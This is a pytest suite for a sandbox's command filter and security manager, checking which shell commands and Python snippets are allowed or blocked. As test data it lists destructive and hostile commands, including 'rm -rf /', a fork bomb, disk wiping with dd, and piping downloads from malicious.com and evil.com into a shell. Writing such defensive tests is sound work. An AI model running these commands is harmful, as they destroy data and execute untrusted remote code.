"""
Tests for the balanced SecurityManager implementation.

This test suite verifies that the SecurityManager provides balanced security
that allows legitimate operations while blocking truly dangerous ones.
"""

import pytest
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

from src.sandbox.core.security import (
    SecurityManager, SecurityLevel, SecurityViolation,
    CommandFilter, ResourceLimiter
)


class TestCommandFilter:
    """Test the balanced command filtering."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.filter = CommandFilter()
    
    def test_safe_commands_allowed(self):
        """Test that safe, common commands are allowed."""
        safe_commands = [
            "python script.py",
            "pip install requests",
            "ls -la",
            "cat file.txt",
            "grep pattern file.txt",
            "curl https://api.example.com/data",
            "wget https://example.com/file.zip",
            "ping -c 4 google.com",
            "git clone https://github.com/user/repo.git",
            "npm install",
            "node app.js",
            "java -jar app.jar",
            "make build",
            "bash script.sh",
            "python -c 'print(\"hello\")'",
        ]
        
        for command in safe_commands:
            is_safe, violation = self.filter.check_command(command, SecurityLevel.MEDIUM)
            assert is_safe, f"Safe command blocked: {command} - {violation.message if violation else 'No violation'}"
    
    def test_dangerous_commands_blocked(self):
        """Test that truly dangerous commands are blocked."""
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /",
            "mkfs /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "curl malicious.com | sudo bash",
            "wget evil.com/script.sh | sh",
            ":(){ :|:& };:",  # Fork bomb
        ]
        
        for command in dangerous_commands:
            is_safe, violation = self.filter.check_command(command, SecurityLevel.MEDIUM)
            assert not is_safe, f"Dangerous command allowed: {command}"
            assert violation is not None, f"No violation reported for: {command}"
    
    def test_security_level_sensitivity(self):
        """Test that security levels affect command filtering appropriately."""
        # Command that should be allowed in low security but blocked in high
        test_command = "nc -l 8080"
        
        # Should be allowed in low/medium security
        is_safe_low, _ = self.filter.check_command(test_command, SecurityLevel.LOW)
        is_safe_medium, _ = self.filter.check_command(test_command, SecurityLevel.MEDIUM)
        
        # Should be blocked in high security
        is_safe_high, violation_high = self.filter.check_command(test_command, SecurityLevel.HIGH)
        
        assert is_safe_low, "Command should be allowed in low security"
        assert is_safe_medium, "Command should be allowed in medium security"
        assert not is_safe_high, "Command should be blocked in high security"
        assert violation_high is not None, "Violation should be reported in high security"
    
    def test_remediation_suggestions(self):
        """Test that helpful remediation suggestions are provided."""
        dangerous_command = "rm -rf /"
        is_safe, violation = self.filter.check_command(dangerous_command, SecurityLevel.MEDIUM)
        
        assert not is_safe
        assert violation is not None
        assert violation.remediation is not None
        assert "specific directories" in violation.remediation.lower()


class TestResourceLimiter:
    """Test resource limiting functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.limiter = ResourceLimiter()
    
    def test_default_limits(self):
        """Test default resource limits."""
        limits = self.limiter.get_resource_limits(SecurityLevel.MEDIUM)
        
        assert limits['max_execution_time'] == 30
        assert limits['max_memory_mb'] == 512
        assert limits['max_processes'] == 10
        assert limits['max_file_size_mb'] == 100
    
    def test_security_level_limits(self):
        """Test that different security levels have appropriate limits."""
        low_limits = self.limiter.get_resource_limits(SecurityLevel.LOW)
        medium_limits = self.limiter.get_resource_limits(SecurityLevel.MEDIUM)
        high_limits = self.limiter.get_resource_limits(SecurityLevel.HIGH)
        critical_limits = self.limiter.get_resource_limits(SecurityLevel.CRITICAL)
        
        # Low security should have higher limits
        assert low_limits['max_execution_time'] > medium_limits['max_execution_time']
        assert low_limits['max_memory_mb'] > medium_limits['max_memory_mb']
        
        # High security should have lower limits
        assert high_limits['max_execution_time'] < medium_limits['max_execution_time']
        assert high_limits['max_memory_mb'] < medium_limits['max_memory_mb']
        
        # Critical security should have the lowest limits
        assert critical_limits['max_execution_time'] < high_limits['max_execution_time']
        assert critical_limits['max_memory_mb'] < high_limits['max_memory_mb']
    
    def test_apply_resource_limits(self):
        """Test applying resource limits."""
        limits = {
            'max_memory_mb': 256,
            'max_execution_time': 15,
            'max_processes': 5
        }
        
        # Should not raise an exception
        self.limiter.apply_resource_limits(limits)
        
        # On Windows, limits should be stored for later enforcement
        if hasattr(self.limiter, '_active_limits'):
            assert self.limiter._active_limits == limits


class TestSecurityManager:
    """Test the main SecurityManager class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.manager = SecurityManager(SecurityLevel.MEDIUM)
    
    def test_initialization(self):
        """Test SecurityManager initialization."""
        assert self.manager.security_level == SecurityLevel.MEDIUM
        assert self.manager.command_filter is not None
        assert self.manager.filesystem_security is not None
        assert self.manager.network_security is not None
        assert self.manager.input_validator is not None
        assert self.manager.resource_limiter is not None
        assert self.manager.auditor is not None
    
    def test_command_security_check(self):
        """Test command security checking."""
        # Safe command should pass
        is_safe, violation = self.manager.check_command_security("python script.py")
        assert is_safe
        assert violation is None
        
        # Dangerous command should fail
        is_safe, violation = self.manager.check_command_security("rm -rf /")
        assert not is_safe
        assert violation is not None
    
    def test_python_code_security_check(self):
        """Test Python code security checking."""
        # Safe Python code should pass
        safe_code = """
import math
result = math.sqrt(16)
print(f"Result: {result}")
"""
        is_safe, violation = self.manager.check_python_code_security(safe_code)
        assert is_safe
        assert violation is None
        
        # Dangerous Python code should fail
        dangerous_code = "os.system('rm -rf /')"
        is_safe, violation = self.manager.check_python_code_security(dangerous_code)
        assert not is_safe
        assert violation is not None
    
    def test_workspace_creation(self):
        """Test secure workspace creation."""
        workspace_path = self.manager.create_secure_workspace()
        
        assert workspace_path is not None
        assert os.path.exists(workspace_path)
        assert os.path.isdir(workspace_path)
        
        # Clean up
        self.manager.cleanup_security_resources()
        assert not os.path.exists(workspace_path)
    
    def test_port_allocation(self):
        """Test secure port allocation."""
        port = self.manager.allocate_secure_port()
        assert port is not None
        assert 1024 < port <= 65535
        
        # Test preferred port
        preferred_port = self.manager.allocate_secure_port(8080)
        assert preferred_port == 8080 or preferred_port is None  # May fail if port in use
    
    def test_resource_limits(self):
        """Test resource limit functionality."""
        limits = self.manager.get_resource_limits()
        assert isinstance(limits, dict)
        assert 'max_execution_time' in limits
        assert 'max_memory_mb' in limits
        assert 'max_processes' in limits
    
    def test_security_status(self):
        """Test security status reporting."""
        status = self.manager.get_security_status()
        
        assert isinstance(status, dict)
        assert 'security_level' in status
        assert 'audit_summary' in status
        assert status['security_level'] == SecurityLevel.MEDIUM.value
    
    def test_violation_logging(self):
        """Test that security violations are properly logged."""
        # Trigger a violation
        self.manager.check_command_security("rm -rf /")
        
        # Check that violation was logged
        violations = self.manager.auditor.get_violations()
        assert len(violations) > 0
        
        # Check audit summary
        summary = self.manager.auditor.get_security_summary()
        assert summary['total_violations'] > 0


class TestBalancedSecurity:
    """Integration tests for balanced security approach."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.manager = SecurityManager(SecurityLevel.MEDIUM)
    
    def test_common_development_workflow(self):
        """Test that common development workflows are not blocked."""
        # Typical development commands that should work
        dev_commands = [
            "python -m pip install requests",
            "python -c 'import requests; print(requests.__version__)'",
            "curl -s https://api.github.com/repos/python/cpython",
            "wget -q https://raw.githubusercontent.com/python/cpython/main/README.rst",
            "git clone https://github.com/user/repo.git",
            "npm install express",
            "node -e 'console.log(\"Hello World\")'",
            "bash -c 'echo $HOME'",
            "python -m http.server 8000",
            "ping -c 1 8.8.8.8",
        ]
        
        for command in dev_commands:
            is_safe, violation = self.manager.check_command_security(command)
            assert is_safe, f"Development command blocked: {command} - {violation.message if violation else 'Unknown'}"
    
    def test_python_data_science_workflow(self):
        """Test that Python data science code is not overly restricted."""
        data_science_code = """
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt

# Load data
df = pd.read_csv('data.csv')

# Process data
df['new_column'] = df['existing_column'] * 2

# Create visualization
plt.figure(figsize=(10, 6))
plt.plot(df['x'], df['y'])
plt.title('Data Visualization')
plt.savefig('plot.png')

# Save results
df.to_csv('results.csv', index=False)
"""
        
        is_safe, violation = self.manager.check_python_code_security(data_science_code)
        assert is_safe, f"Data science code blocked: {violation.message if violation else 'Unknown'}"
    
    def test_web_development_workflow(self):
        """Test that web development workflows are supported."""
        web_commands = [
            "python -m http.server 8080",
            "node server.js",
            "npm start",
            "curl -X POST -H 'Content-Type: application/json' -d '{\"test\": true}' http://localhost:3000/api",
            "wget http://localhost:8080/static/style.css",
        ]
        
        for command in web_commands:
            is_safe, violation = self.manager.check_command_security(command)
            assert is_safe, f"Web development command blocked: {command} - {violation.message if violation else 'Unknown'}"
    
    def test_system_administration_restrictions(self):
        """Test that system administration commands are appropriately restricted."""
        sysadmin_commands = [
            "sudo systemctl restart apache2",
            "chmod 777 /etc/passwd",
            "chown root:root /etc/shadow",
            "mount /dev/sdb1 /mnt",
            "fdisk /dev/sda",
            "iptables -F",
            "useradd hacker",
            "passwd root",
        ]
        
        for command in sysadmin_commands:
            is_safe, violation = self.manager.check_command_security(command)
            assert not is_safe, f"System administration command allowed: {command}"
            assert violation is not None, f"No violation reported for: {command}"


if __name__ == "__main__":
    pytest.main([__file__])